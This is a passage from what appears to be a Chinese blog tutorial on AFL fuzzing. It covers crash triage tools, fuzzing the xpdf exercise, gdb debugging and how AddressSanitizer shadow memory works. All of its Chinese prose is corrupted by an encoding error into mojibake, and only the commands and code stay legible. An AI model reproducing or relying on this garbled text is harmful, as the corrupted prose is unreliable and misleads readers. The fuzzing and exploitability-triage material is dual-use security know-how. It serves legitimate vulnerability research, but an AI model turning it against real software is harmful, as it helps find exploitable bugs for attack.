‡å¯ä»¥è§£æçš„ç§å­ï¼Œæœ‰æ•ˆè¾“å…¥å¯ä»¥æ›´å¿«çš„æ‰¾åˆ°æ›´å¤šæ‰§è¡Œè·¯å¾„ã€‚</li></ul></li><li>å°½é‡å°çš„ä½“ç§¯<ul><li>è¾ƒå°çš„æ–‡ä»¶ä¼šä¸ä»…å¯ä»¥å‡å°‘æµ‹è¯•å’Œå¤„ç†çš„æ—¶é—´ï¼Œä¹Ÿèƒ½èŠ‚çº¦æ›´å¤šçš„å†…å­˜ï¼ŒAFLç»™å‡ºçš„å»ºè®®æ˜¯æœ€å¥½å°äº1 KBï¼Œä½†å…¶å®å¯ä»¥æ ¹æ®è‡ªå·±æµ‹è¯•çš„ç¨‹åºæƒè¡¡ï¼Œè¿™åœ¨AFLæ–‡æ¡£çš„<code>perf_tips.txt</code>ä¸­æœ‰å…·ä½“è¯´æ˜ã€‚</li></ul></li></ul><p>å¯»æ‰¾ï¼š</p><ol><li>ä½¿ç”¨é¡¹ç›®è‡ªèº«æä¾›çš„æµ‹è¯•ç”¨ä¾‹</li><li>ç›®æ ‡ç¨‹åºbugæäº¤é¡µé¢</li><li>ä½¿ç”¨æ ¼å¼è½¬æ¢å™¨ï¼Œç”¨ä»ç°æœ‰çš„æ–‡ä»¶æ ¼å¼ç”Ÿæˆä¸€äº›ä¸å®¹æ˜“æ‰¾åˆ°çš„æ–‡ä»¶æ ¼å¼ï¼š</li><li>aflæºç çš„testcasesç›®å½•ä¸‹æä¾›äº†ä¸€äº›æµ‹è¯•ç”¨ä¾‹</li><li>å…¶ä»–å¤§å‹çš„è¯­æ–™åº“</li></ol><h3 id="ç»“æŸfuzz"><a href="#ç»“æŸfuzz" class="headerlink" title="ç»“æŸfuzz"></a>ç»“æŸfuzz</h3><p>çŠ¶æ€çª—å£ä¸­â€cycles doneâ€å­—æ®µé¢œè‰²å˜ä¸ºç»¿è‰²è¯¥å­—æ®µçš„é¢œè‰²å¯ä»¥ä½œä¸ºä½•æ—¶åœæ­¢æµ‹è¯•çš„å‚è€ƒï¼Œéšç€å‘¨æœŸæ•°ä¸æ–­å¢å¤§ï¼Œå…¶é¢œè‰²ä¹Ÿä¼šç”±æ´‹çº¢è‰²ï¼Œé€æ­¥å˜ä¸ºé»„è‰²ã€è“è‰²ã€ç»¿è‰²ã€‚å½“å…¶å˜ä¸ºç»¿è‰²æ—¶ï¼Œç»§ç»­Fuzzingä¸‹å»ä¹Ÿå¾ˆéš¾æœ‰æ–°çš„å‘ç°äº†ï¼Œè¿™æ—¶ä¾¿å¯ä»¥é€šè¿‡Ctrl-Cåœæ­¢afl-fuzzã€‚</p><p>Â è·ä¸Šä¸€æ¬¡å‘ç°æ–°è·¯å¾„ï¼ˆæˆ–è€…å´©æºƒï¼‰å·²ç»è¿‡å»å¾ˆé•¿æ—¶é—´äº†ï¼Œè‡³äºå…·ä½“å¤šå°‘æ—¶é—´è¿˜æ˜¯éœ€è¦è‡ªå·±æŠŠæ¡ï¼Œæ¯”å¦‚é•¿è¾¾ä¸€ä¸ªæ˜ŸæœŸæˆ–è€…æ›´ä¹…ä¼°è®¡å¤§å®¶ä¹Ÿéƒ½æ²¡å•¥è€å¿ƒäº†å§ã€‚</p><p>ç›®æ ‡ç¨‹åºçš„ä»£ç å‡ ä¹è¢«æµ‹è¯•ç”¨ä¾‹å®Œå…¨è¦†ç›–ï¼Œè¿™ç§æƒ…å†µå¥½åƒå¾ˆå°‘è§ï¼Œä½†æ˜¯å¯¹äºæŸäº›å°å‹ç¨‹åºåº”è¯¥è¿˜æ˜¯å¯èƒ½çš„ï¼Œè‡³äºå¦‚ä½•è®¡ç®—è¦†ç›–ç‡å°†åœ¨ä¸‹é¢ä»‹ç»ã€‚</p><p>ä¸Šé¢æåˆ°çš„pythiaæä¾›çš„å„ç§æ•°æ®ä¸­ï¼Œä¸€æ—¦<strong>path covera</strong>è¾¾åˆ°99ï¼…ï¼ˆé€šå¸¸æ¥è¯´ä¸å¤ªå¯èƒ½ï¼‰ï¼Œå¦‚æœä¸æœŸæœ›å†è·‘å‡ºæ›´å¤šcrashçš„è¯å°±å¯ä»¥ä¸­æ­¢fuzzäº†ï¼Œå› ä¸ºå¾ˆå¤šcrashå¯èƒ½æ˜¯å› ä¸ºç›¸åŒçš„åŸå› å¯¼è‡´çš„ï¼›è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯<strong>correctness</strong>çš„å€¼è¾¾åˆ°<strong>1e-08</strong>ï¼Œæ ¹æ®pythiaå¼€å‘è€…çš„è¯´æ³•ï¼Œè¿™æ—¶ä»ä¸Šæ¬¡å‘ç°path&#x2F;uniq crashåˆ°ä¸‹ä¸€æ¬¡å‘ç°ä¹‹é—´å¤§çº¦éœ€è¦1äº¿æ¬¡æ‰§è¡Œï¼Œè¿™ä¸€ç‚¹ä¹Ÿå¯ä»¥ä½œä¸ºè¡¡é‡ä¾æ®ã€‚</p><h3 id="è¾“å‡ºç»“æœ"><a href="#è¾“å‡ºç»“æœ" class="headerlink" title="è¾“å‡ºç»“æœ"></a>è¾“å‡ºç»“æœ</h3><ul><li>queueï¼šå­˜æ”¾æ‰€æœ‰å…·æœ‰ç‹¬ç‰¹æ‰§è¡Œè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ã€‚  </li><li>crashesï¼šå¯¼è‡´ç›®æ ‡æ¥æ”¶è‡´å‘½signalè€Œå´©æºƒçš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚  </li><li>crashes&#x2F;README.txtï¼šä¿å­˜äº†ç›®æ ‡æ‰§è¡Œè¿™äº›crashæ–‡ä»¶çš„å‘½ä»¤è¡Œå‚æ•°ã€‚  </li><li>hangsï¼šå¯¼è‡´ç›®æ ‡è¶…æ—¶çš„ç‹¬ç‰¹æµ‹è¯•ç”¨ä¾‹ã€‚  </li><li>fuzzer_statsï¼šafl-fuzzçš„è¿è¡ŒçŠ¶æ€ã€‚  </li><li>plot_dataï¼šç”¨äºafl-plotç»˜å›¾ã€‚</li></ul><h3 id="å¤„ç†æµ‹è¯•ç»“æœ"><a href="#å¤„ç†æµ‹è¯•ç»“æœ" class="headerlink" title="å¤„ç†æµ‹è¯•ç»“æœ"></a>å¤„ç†æµ‹è¯•ç»“æœ</h3><ul><li>crash exploration mode</li></ul><p>è¿™æ˜¯afl-fuzzçš„ä¸€ç§è¿è¡Œæ¨¡å¼ï¼Œä¹Ÿç§°ä¸º<strong>peruvian rabbit mode</strong>ï¼Œç”¨äºç¡®å®šbugçš„å¯åˆ©ç”¨æ€§</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">afl-fuzz -m <span class="hljs-attribute">none</span> -C -<span class="hljs-selector-tag">i</span> poc -o peruvian-were-rabbit_out -- ~/<span class="hljs-attribute">src</span>/LuPng/<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.out</span> @@ out.png<br></code></pre></td></tr></table></figure><ul><li>triage_crashes</li></ul><p>AFLæºç çš„experimentalç›®å½•ä¸­æœ‰ä¸€ä¸ªåä¸º_triage_crashes.sh_çš„è„šæœ¬ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è§¦å‘æ”¶é›†åˆ°çš„crashesã€‚ä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œ11ä»£è¡¨äº†SIGSEGVä¿¡å·ï¼Œæœ‰å¯èƒ½æ˜¯å› ä¸ºç¼“å†²åŒºæº¢å‡ºå¯¼è‡´è¿›ç¨‹å¼•ç”¨äº†æ— æ•ˆçš„å†…å­˜ï¼›06ä»£è¡¨äº†SIGABRTä¿¡å·ï¼Œå¯èƒ½æ˜¯æ‰§è¡Œäº†abort\assertå‡½æ•°æˆ–double freeå¯¼è‡´ï¼Œè¿™äº›ç»“æœå¯ä»¥ä½œä¸ºç®€å•çš„å‚è€ƒã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">triage_crashes.sh fuzz_out ~/src/LuPng/a.out<br></code></pre></td></tr></table></figure><ul><li>crashwalk</li></ul><p>å½“ç„¶ä¸Šé¢çš„ä¸¤ç§æ–¹å¼éƒ½è¿‡äºé¸¡è‚‹äº†ï¼Œå¦‚æœä½ æƒ³å¾—åˆ°æ›´ç»†è‡´çš„crashesåˆ†ç±»ç»“æœï¼Œä»¥åŠå¯¼è‡´crashesçš„å…·ä½“åŸå› ï¼Œé‚£ä¹ˆ<a href="https://github.com/bnagy/crashwalk">crashwalk</a>å°±æ˜¯ä¸é”™çš„é€‰æ‹©ä¹‹ä¸€ã€‚è¿™ä¸ªå·¥å…·åŸºäºgdbçš„exploitableæ’ä»¶ï¼Œå®‰è£…ä¹Ÿç›¸å¯¹ç®€å•ï¼Œåœ¨ubuntuä¸Šï¼Œåªéœ€è¦å¦‚ä¸‹å‡ æ­¥å³å¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">apt-get install gdb golang</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> tools</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> tools</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/jfoote/exploitable.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> go</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> GOPATH=~/tools/go</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> CW_EXPLOITABLE=~/tools/exploitable/exploitable/exploitable.py</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">go get -u github.com/bnagy/crashwalk/cmd/...</span><br></code></pre></td></tr></table></figure><p>crashwalkæ”¯æŒAFL&#x2F;Manualä¸¤ç§æ¨¡å¼ã€‚å‰è€…é€šè¿‡è¯»å–<strong>crashes&#x2F;README.txt</strong>æ–‡ä»¶è·å¾—ç›®æ ‡çš„æ‰§è¡Œå‘½ä»¤ï¼ˆå‰é¢ç¬¬ä¸‰èŠ‚ä¸­æåˆ°çš„ï¼‰ï¼Œåè€…åˆ™å¯ä»¥æ‰‹åŠ¨æŒ‡å®šä¸€äº›å‚æ•°ã€‚ä¸¤ç§ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">Manual Mode</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match <span class="hljs-built_in">id</span> -- ~/parse @@</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">AFL Mode</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">~/tools/go/bin/cwtriage -root syncdir -afl</span><br></code></pre></td></tr></table></figure><ul><li>afl-collect</li></ul><p>æœ€åé‡ç£…æ¨èçš„å·¥å…·ä¾¿æ˜¯_afl-collect_ï¼Œå®ƒä¹Ÿæ˜¯_afl-utils_å¥—ä»¶ä¸­çš„ä¸€ä¸ªå·¥å…·ï¼ŒåŒæ ·ä¹Ÿæ˜¯åŸºäºexploitableæ¥æ£€æŸ¥crashesçš„å¯åˆ©ç”¨æ€§ã€‚å®ƒå¯ä»¥è‡ªåŠ¨åˆ é™¤æ— æ•ˆçš„crashæ ·æœ¬ã€åˆ é™¤é‡å¤æ ·æœ¬ä»¥åŠè‡ªåŠ¨åŒ–æ ·æœ¬åˆ†ç±»ã€‚ä½¿ç”¨èµ·æ¥å‘½ä»¤ç¨å¾®é•¿ä¸€ç‚¹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir --  /path/to/target --target-opts</span><br></code></pre></td></tr></table></figure><h2 id="åŸºç¡€å®ä¾‹"><a href="#åŸºç¡€å®ä¾‹" class="headerlink" title="åŸºç¡€å®ä¾‹"></a>åŸºç¡€å®ä¾‹</h2><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><ul><li>ç¼–è¯‘</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">è¿›å…¥é¡¹ç›®ç›®å½•</span><br>cd /root/Fuzzing101/Exercise1<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">å®‰è£…ç¼–è¯‘å·¥å…·</span><br>sudo apt install build-essential<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">ä¸‹è½½xpdfæºç </span><br>wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz<br>tar -xvzf xpdf-3.02.tar.gz<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">ç¼–è¯‘</span><br>cd xpdf-3.02<br>./configure --prefix=&quot;/root/Fuzzing101/Exercise1/xpdf-3.02/install/&quot;<br>make<br>make install<br></code></pre></td></tr></table></figure><ul><li>æµ‹è¯•</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd <br>mkdir pdf_examples &amp;&amp; cd pdf_examples<br>wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf<br>wget http://www.africau.edu/images/default/sample.pdf<br>wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf<br></code></pre></td></tr></table></figure><h3 id="ç¼–è¯‘æ’æ¡©"><a href="#ç¼–è¯‘æ’æ¡©" class="headerlink" title="ç¼–è¯‘æ’æ¡©"></a>ç¼–è¯‘æ’æ¡©</h3><ul><li>afl-gcc</li><li>afl-clang-fast</li><li>afl-clang-lto</li></ul><p>afl-clang-ltoæ˜¯å½“å‰æœ€ä½³é€‰æ‹©ï¼Œå…¶ä¼˜åŠ¿åŒ…æ‹¬ï¼š</p><ul><li>æ— å†²çªæ’æ¡©</li><li>æ¯”afl-clang-fastæ›´å¿«</li><li>æä¾›æ›´å¥½çš„æµ‹è¯•ç»“æœ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ä½¿ç”¨afl-clang-fastç¼–è¯‘</span><br>cd xpdf-3.02<br>export LLVM_CONFIG=&quot;llvm-config-11&quot;<br>CC=&quot;/AFLplusplus/afl-clang-fast&quot; CXX=&quot;/AFLplusplus/afl-clang-fast++&quot; \<br>./configure --prefix=&quot;/root/Fuzzing101/Exercise1/xpdf-3.02/install&quot;<br>make<br>make install<br></code></pre></td></tr></table></figure><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3><ul><li>å¼€å§‹Fuzz</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -i in -o out -s 123 -- xpdf-3.02/install/bin/pdftotext   -- xpdf-3.02/install/bin/pdftotext @@ xpdf-3.02/install output<br></code></pre></td></tr></table></figure><ul><li><code>-i</code>ï¼šè¾“å…¥ç§å­ç›®å½•</li><li><code>-o</code>ï¼šè¾“å‡ºç›®å½•</li><li><code>-s</code>ï¼šéšæœºç§å­</li><li><code>--</code>ï¼šè®¾ç½®æµ‹è¯•ç›®æ ‡</li><li><code>@@</code>ï¼šå ä½ç¬¦ï¼Œè¡¨ç¤ºAFLä¼šå°†å˜å¼‚åçš„æ–‡ä»¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™ç›®æ ‡ç¨‹åºã€‚</li></ul><p>è‹¥å‡ºç°æ ¸å¿ƒè½¬å‚¨æç¤ºï¼Œæ‰§è¡Œï¼š</p><p>è·‘äº†ä¸‰ä¸ªå°æ—¶ã€‚ã€‚</p><p><img src="/Linux/assets/Pasted%20image%2020250414145110.png"></p><h3 id="crashåˆ†æ"><a href="#crashåˆ†æ" class="headerlink" title="crashåˆ†æ"></a>crashåˆ†æ</h3><p>gdbè°ƒè¯•</p><p>é¦–å…ˆå®šä¹‰åˆ°å‘ç”Ÿå´©æºƒçš„ç‚¹ï¼ŒåŠ¨é™ç»“åˆã€‚</p><p>é€šè¿‡idaé™æ€åˆ†æç»“åˆåŠ¨æ€åˆ†æè¿›è¡Œå®šä½ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gdb --args $HOME/Desktop/Fuzz/training/fuzzing_xpdf/install/bin/pdftotext $HOME/Desktop/Fuzz/training/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:000182,time:11158,execs:4841,op:havoc,rep:2 $HOME/Desktop/Fuzz/training/fuzzing_xpdf/output<br></code></pre></td></tr></table></figure><h3 id="vscode-gdbåˆ†æ"><a href="#vscode-gdbåˆ†æ" class="headerlink" title="vscode+gdbåˆ†æ"></a>vscode+gdbåˆ†æ</h3><p>é€šè¿‡ vscode+gdb è¿›è¡ŒåŠ¨æ€è°ƒè¯•ã€‚</p><p>åœ¨ vscode è¦è°ƒè¯•çš„æ–‡ä»¶ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>.vscode</code>ç›®å½•ï¼Œå¹¶åœ¨ç›®å½•ä¸‹ç¼–å†™ä¸€ä¸ª<code>launch.json</code>æ–‡ä»¶ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>Â  Â  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>Â  Â  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>Â  Â  Â  Â  <span class="hljs-punctuation">&#123;</span><br>Â  Â  Â  Â  Â  Â  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Debug&quot;</span><span class="hljs-punctuation">,</span><br>Â  Â  Â  Â  Â  Â  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;gdb&quot;</span><span class="hljs-punctuation">,</span><br>Â  Â  Â  Â  Â  Â  <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>Â  Â  Â  Â  Â  Â  <span class="hljs-attr">&quot;target&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./uaf&quot;</span><span class="hljs-punctuation">,</span><br>Â  Â  Â  Â  Â  Â  <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="hljs-punctuation">,</span><br>Â  Â  Â  Â  Â  Â  <span class="hljs-attr">&quot;valuesFormatting&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;parseText&quot;</span><span class="hljs-punctuation">,</span><br>Â  Â  Â  Â  <span class="hljs-punctuation">&#125;</span><br>Â  Â  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="é«˜çº§åŠŸèƒ½"><a href="#é«˜çº§åŠŸèƒ½" class="headerlink" title="é«˜çº§åŠŸèƒ½"></a>é«˜çº§åŠŸèƒ½</h2><h3 id="ASan"><a href="#ASan" class="headerlink" title="ASan"></a>ASan</h3><p>AddressSanitizer (ASan) æ˜¯ Google å¼€å‘çš„ C&#x2F;C++ å†…å­˜é”™è¯¯æ£€æµ‹å·¥å…·ï¼ŒåŒ…å«ï¼š</p><ul><li>ç¼–è¯‘å™¨æ’æ¡©æ¨¡å—</li><li>è¿è¡Œæ—¶åº“</li></ul><p>å¯æ£€æµ‹ä»¥ä¸‹é—®é¢˜ï¼š</p><ul><li>å †&#x2F;æ ˆ&#x2F;å…¨å±€å˜é‡çš„è¶Šç•Œè®¿é—®</li><li>é‡Šæ”¾åä½¿ç”¨ï¼ˆuse-after-freeï¼‰</li><li>é‡å¤é‡Šæ”¾</li><li>å†…å­˜æ³„æ¼</li></ul><p>é¦–å…ˆæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯ ASanã€‚ASan ä¸€ä¸ª C å’Œ C++ çš„å†…å­˜é”™è¯¯æ£€æŸ¥å·¥å…·ï¼ŒåŒ…å«ä¸€ä¸ªç¼–è¯‘å™¨æ’æ¡©æ¨¡å—å’Œä¸€ä¸ªè¿è¡Œæ—¶åº“ï¼Œå¯ä»¥å‘ç°å¯¹å †ã€æ ˆç­‰å†…å­˜ç ´åæ¼æ´ã€‚</p><p>AddressSanitizerï¼Œåˆç§° <strong>ASAN</strong>ï¼Œæ•´åˆäº† LeakSanitizer (<strong>LSAN</strong>)ï¼Œç”¨äº C&#x2F;C++ ä¸­æ£€æµ‹å†…å­˜é”™è¯¯ã€‚ç”±äºèƒ½å¤Ÿæ£€æµ‹åˆ°è¶Šç•Œã€use-after-free å’Œå†…å­˜æ³„æ¼ç­‰é—®é¢˜ï¼Œé€šå¸¸åœ¨å¤§å¤šæ•° fuzzing ä¸­éƒ½ä¼šä½¿ç”¨ï¼Œçº¦ä¼šå¯¼è‡´ 2x çš„ slowdownã€‚AddressSanitizer æœ‰å‘è¡¨è®ºæ–‡ <a href="https://static.googleusercontent.com/media/research.google.com/zh-TW//pubs/archive/37752.pdf">AddressSanitizer: A Fast Address Sanity Checker</a>ï¼Œè¾ƒä¸ºç®€æ´çš„è¯´æ˜å¯ä»¥å‚è€ƒ<a href="https://suelan.github.io/2020/08/18/20200817-address-sanitizer/">æ­¤ç½‘ç«™</a>çš„ä»‹ç»ï¼Œä¸‹é¢åªä¼šåšç®€å•çš„ä»‹ç»ã€‚</p><p>æ¯ä¸ªå˜é‡éƒ½ä¼šæœ‰è‡ªå·±çš„å†…å­˜ç©ºé—´æ¥å­˜å‚¨å€¼ï¼Œä¹Ÿå°±æ˜¯ä¸‹æ–¹å›¾ç¤ºä¸­çš„ <code>var&#123;1,2,3,4&#125;</code> å„è‡ªçš„æ–¹æ ¼ï¼Œè€Œè¿™äº›å†…å­˜æœ‰ä¸€ä¸ªé‡è¦çš„ç‰¹æ€§ï¼šéƒ½æ˜¯<strong>è¿ç»­åˆ†é…</strong>ï¼Œå› æ­¤å¦‚æœå˜é‡ <code>var1</code> å‘ç”Ÿè¶Šç•Œæ¼æ´ï¼Œæœ‰å¯èƒ½ä¼šå½±å“åˆ° <code>var&#123;2,3,4&#125;</code> çš„å€¼ï¼Œä»è€Œæ”¹å˜åŸæœ¬ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</p><p>ç„¶è€Œ ASAN ä¼šåœ¨åŸæœ¬çš„è¿ç»­å†…å­˜ä¸­é—´æ’å…¥ <strong>red zone</strong>ï¼Œä»£è¡¨è¿™äº›æ˜¯ä¸åº”è¢«è®¿é—®çš„å†…å­˜åŒºåŸŸã€‚å¦‚æœ <code>var1</code> ä¼šå½±å“åˆ° <code>var&#123;2,3,4&#125;</code>ï¼Œå¾ˆæœ‰å¯èƒ½ä¹Ÿä¼šä¿®æ”¹åˆ°ä¸­é—´çš„ red zoneï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡æ£€æŸ¥ red zone æ˜¯å¦è¢«æ±¡æŸ“æ¥åˆ¤æ–­æ¼æ´çš„å‘ç”Ÿã€‚</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/3-0.png"><br>å› æ­¤åœ¨æ¯æ¬¡è¿›è¡Œå†…å­˜è®¿é—®å‰ï¼Œä¼šæ£€æŸ¥è®¿é—®åœ°å€æ˜¯å¦ä½äº red zoneï¼Œå¦‚æœæ˜¯ï¼Œå°±ä¼šè§¦å‘ asan æŠ¥å‘Šï¼Œå°†é”™è¯¯åŸå› è¾“å‡ºã€‚</p><p>å®é™…ä½¿ç”¨ <strong>shadow memory</strong> æŠ€æœ¯æ¥ä¼˜åŒ–è®¿é—®é€Ÿåº¦ã€‚å‡è®¾è®¿é—®çš„å†…å­˜åœ°å€ä¸º 0x87870000ï¼Œé¦–å…ˆä¼šå°†è¯¥åœ°å€å³ç§»ä¸‰ä¸ª 3 ä½ (1)ï¼Œå†åŠ ä¸Šä¸€ä¸ªå›ºå®šçš„åç§»é‡ (2)ï¼Œå¾—åˆ°çš„å†…å­˜åœ°å€å°±æ˜¯ shadow memoryã€‚</p><p>shadow memory ä¸­å­˜æ”¾çš„å€¼è¡¨ç¤ºè¦è®¿é—®çš„å†…å­˜ç±»å‹ï¼Œå¦‚æœå€¼ä¸º 00ï¼Œè¡¨ç¤ºæ­£å¸¸èŒƒå›´ï¼Œ01~07 è¡¨ç¤ºå†…å­˜æœ¬æ¥å°±ä¸å¯¹é½ï¼Œå› æ­¤è¿˜éœ€è¦è€ƒè™‘å†…å­˜è®¿é—®æ—¶çš„åç§»é‡ (4)ã€‚è€Œå°äº 0 çš„å€¼è¡¨ç¤ºæ¼æ´å‘ç”Ÿ (3)ï¼Œå¹¶ä¸”ä¸åŒçš„å€¼ä»£è¡¨ä¸åŒçš„æ„ä¹‰ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå½“å‘ç”Ÿ <strong>Freed heap region</strong> (UAF) æ¼æ´æ—¶ï¼Œå€¼å°±ä¼šæ˜¯ <code>fd</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *a;  <br><span class="hljs-type">char</span> magic;  <br><span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> shadow_mem_addr;  <br>â€‹  <br>a = (<span class="hljs-type">void</span> *)<span class="hljs-number">0x87870000</span>;  <br>shadow_mem_addr = (<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span>)a &gt;&gt; <span class="hljs-number">3</span>; <span class="hljs-comment">// (1)  </span><br>shadow_mem_addr += <span class="hljs-number">0x7fff8000</span>; <span class="hljs-comment">// (2)  </span><br>magic = *(<span class="hljs-type">char</span> *)shadow_mem_addr;  <br>â€‹  <br><span class="hljs-keyword">if</span> (magic &lt; <span class="hljs-number">0</span>) <span class="hljs-comment">// (3)  </span><br> Â  Â dump_and_abort();  <br>â€‹  <br><span class="hljs-keyword">if</span> ( ((<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span>)a &amp; <span class="hljs-number">7</span>) &gt; magic) <span class="hljs-comment">// (4)  </span><br> Â  Â dump_and_abort();<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ç”¨ <code>var&#123;1,2,3,4&#125;</code> åšä»‹ç»ï¼Œè¿™é‡Œç”¨ <code>var&#123;1,2&#125;</code> ç¤ºèŒƒ shadow memory çš„åº”ç”¨ï¼š</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/3-1.png"></p><p>è€Œ <strong>leak checker</strong> (LSAN) ä¼šåœ¨ç¨‹åºç»“æŸæ‰§è¡Œå‰æ‰§è¡Œå¦ä¸€ä¸ªè¿›ç¨‹ï¼Œå¹¶é€šè¿‡ ptrace æ¥ attach å½“å‰çš„è¿›ç¨‹ã€‚æ¥ç€ä¼šåˆ†æï¼š1. å…¨å±€å˜é‡ã€2. æ­£åœ¨æ‰§è¡Œçº¿ç¨‹çš„æ 